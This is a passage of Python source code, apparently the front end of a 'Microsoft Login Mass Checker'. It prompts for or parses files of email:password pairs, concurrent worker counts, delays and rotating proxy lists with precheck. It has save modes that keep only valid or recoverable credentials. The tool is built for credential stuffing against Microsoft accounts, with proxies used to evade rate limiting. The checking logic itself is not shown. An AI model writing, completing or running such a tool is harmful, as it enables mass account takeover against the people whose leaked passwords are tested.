        raw = input(f"{prompt}{suffix}: ").strip()
        if not raw and default is not None:
            return default
        if not raw:
            print("  Please enter a value.")
            continue
        try:
            return cast(raw)
        except ValueError:
            print(f"  Invalid value; expected {cast.__name__}.")


def ask_yes_no(prompt, default=False):
    d = "Y/n" if default else "y/N"
    while True:
        raw = input(f"{prompt} [{d}]: ").strip().lower()
        if not raw:
            return default
        if raw in ("y", "yes"):
            return True
        if raw in ("n", "no"):
            return False


def run_interactive():
    _install_signal_handler()
    print("=" * 60)
    print("Microsoft Login Mass Checker - Interactive Setup")
    print("=" * 60)

    input_file = ask("Input file path (email:password per line)")
    output_file = ask("Output file path", default="results.txt")
    max_workers = ask("Number of concurrent workers", default=5, cast=int)
    delay = ask("Delay per worker (seconds before each account)",
                default=0.0, cast=float)

    print("  Save modes:")
    print("    all                       - save everything")
    print("    working                   - valid creds only")
    print("    working_undecided         - valid + undecided")
    print("    working_undecided_recover - valid + undecided + recover")
    save_mode = ask("Save mode", default="all")
    if save_mode not in ("all", "working", "working_undecided",
                         "working_undecided_recover"):
        print("  Unrecognized; defaulting to 'all'.")
        save_mode = "all"

    use_proxies = ask_yes_no("Use proxies?", default=False)
    proxies = []
    proxy_mode = "round_robin"
    precheck = True
    proxy_timeout = 10
    if use_proxies:
        proxy_file = ask("Proxy file path")
        if proxy_file:
            proxies = load_proxies(proxy_file)
        if proxies:
            print("  Proxy modes: round_robin / random")
            proxy_mode = ask("Proxy mode", default="round_robin")
            if proxy_mode not in ("round_robin", "random"):
                proxy_mode = "round_robin"
            precheck = ask_yes_no(
                f"Precheck all {len(proxies)} proxies before starting? "
                f"(removes dead ones)", default=True)
            if precheck:
                proxy_timeout = ask("Proxy check timeout (seconds)",
                                    default=10, cast=int)

    verbose = ask_yes_no("Verbose (save debug HTML)?", default=False)

    print("=" * 60)
    print("[INFO] Starting...")
    print("=" * 60)

    checker = MassChecker(
        input_file=input_file,
        output_file=output_file,
        max_workers=max_workers,
        save_mode=save_mode,
        verbose=verbose,
        proxies=proxies,
        proxy_mode=proxy_mode,
        delay=delay,
        precheck_proxies=precheck,
        proxy_check_timeout=proxy_timeout,
    )
    checker.run()


def run_cli():
    import argparse
    _install_signal_handler()
    parser = argparse.ArgumentParser(description="Microsoft Login Mass Checker")
    parser.add_argument("-f", "--file", required=True)
    parser.add_argument("-o", "--output", default="results.txt")
    parser.add_argument("-w", "--workers", type=int, default=10)
    parser.add_argument("-d", "--delay", type=float, default=0.0)
    parser.add_argument("-m", "--mode",
                        choices=["all", "working", "working_undecided",
                                 "working_undecided_recover"],
                        default="all")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-p", "--proxies", default=None)
    parser.add_argument("-pm", "--proxy-mode",
                        choices=["round_robin", "random"],
                        default="round_robin")
    parser.add_argument("--no-precheck", action="store_true",
                        help="Skip proxy precheck")
    parser.add_argument("--proxy-timeout", type=int, default=10,
                        help="Proxy check timeout in seconds")
    args = parser.parse_args()

    proxies = load_proxies(args.proxies) if args.proxies else []
    checker = MassChecker(
        input_file=args.file,
        output_file=args.output,
        max_workers=args.workers,
        save_mode=args.mode,
        verbose=args.verbose,
        proxies=proxies,
        proxy_mode=args.proxy_mode,
        delay=args.delay,
        precheck_proxies=not args.no_precheck,
        proxy_check_timeout=args.proxy_timeout,
    )
    checker.run()


if __name__ == "__main__":
    if len(sys.argv) == 1:
        try:
            run_interactive()
        except KeyboardInterrupt:
            print("\n[INFO] Cancelled.")
    else:
        run_cli()